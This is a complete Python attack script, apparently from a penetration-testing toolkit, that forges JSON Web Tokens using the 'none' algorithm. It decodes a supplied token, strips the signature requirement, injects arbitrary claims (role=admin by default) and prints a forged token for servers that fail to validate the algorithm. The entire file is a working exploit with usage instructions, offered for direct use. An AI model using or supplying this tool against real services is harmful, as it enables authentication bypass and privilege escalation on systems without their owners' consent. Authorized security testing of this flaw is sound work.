#!/usr/bin/env python3
"""JWT None Algorithm Attack

Forges a JWT token with the 'none' algorithm, allowing arbitrary claims
without a valid signature. Used when servers don't enforce algorithm validation.

Usage:
    python3 jwt-none-attack.py <original-jwt>
    python3 jwt-none-attack.py <original-jwt> --role admin
    python3 jwt-none-attack.py <original-jwt> --claim role=admin --claim username=superuser
"""
import base64
import json
import sys


def b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_token(original_jwt: str, claim_overrides: dict) -> str:
    parts = original_jwt.split(".")
    if len(parts) != 3:
        print(f"Error: Expected 3 JWT parts, got {len(parts)}", file=sys.stderr)
        sys.exit(1)

    # Decode original
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    print(f"Original header:  {json.dumps(header)}")
    print(f"Original payload: {json.dumps(payload)}")
    print()

    # Forge with none algorithm
    header["alg"] = "none"
    payload.update(claim_overrides)

    forged_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    forged_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    forged_jwt = f"{forged_header}.{forged_payload}."

    print(f"Forged header:  {json.dumps(header)}")
    print(f"Forged payload: {json.dumps(payload)}")
    print()
    print(f"Forged JWT:")
    print(forged_jwt)

    return forged_jwt


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    original_jwt = sys.argv[1]
    claim_overrides = {}

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--role" and i + 1 < len(sys.argv):
            claim_overrides["role"] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--claim" and i + 1 < len(sys.argv):
            key, value = sys.argv[i + 1].split("=", 1)
            # Try to parse as JSON value (for booleans, numbers)
            try:
                value = json.loads(value)
            except (json.JSONDecodeError, ValueError):
                pass
            claim_overrides[key] = value
            i += 2
        else:
            print(f"Unknown argument: {sys.argv[i]}", file=sys.stderr)
            sys.exit(1)

    if not claim_overrides:
        claim_overrides = {"role": "admin"}
        print("No claims specified, defaulting to role=admin")
        print()

    forge_token(original_jwt, claim_overrides)


if __name__ == "__main__":
    main()
